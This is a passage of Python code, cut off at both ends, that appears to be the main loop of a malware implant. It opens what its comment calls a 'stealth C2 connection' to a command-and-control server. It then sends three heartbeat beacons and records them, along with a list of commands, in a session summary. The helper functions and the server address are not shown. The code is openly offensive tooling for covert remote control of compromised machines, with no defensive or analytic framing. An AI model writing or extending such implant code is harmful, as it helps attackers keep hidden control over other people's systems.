    # Ensure target directory exists
    os.makedirs('./target', exist_ok=True)

    session_summary = {
        'heartbeats': [],
        'commands': []
    }

    # Establish stealth C2 connection
    c2_sock = establish_c2_connection()
    if not c2_sock:
        logging.error("Failed to establish C2 connection")
        return

    # Perform 3 heartbeat cycles
    for i in range(3):
        logging.info(f"Starting heartbeat cycle {i+1}")

        # Send heartbeat
        success, response = send_heartbeat(c2_sock)
        session_summary['heartbeats'].append({
            'cycle': i+1,
            'success': success,
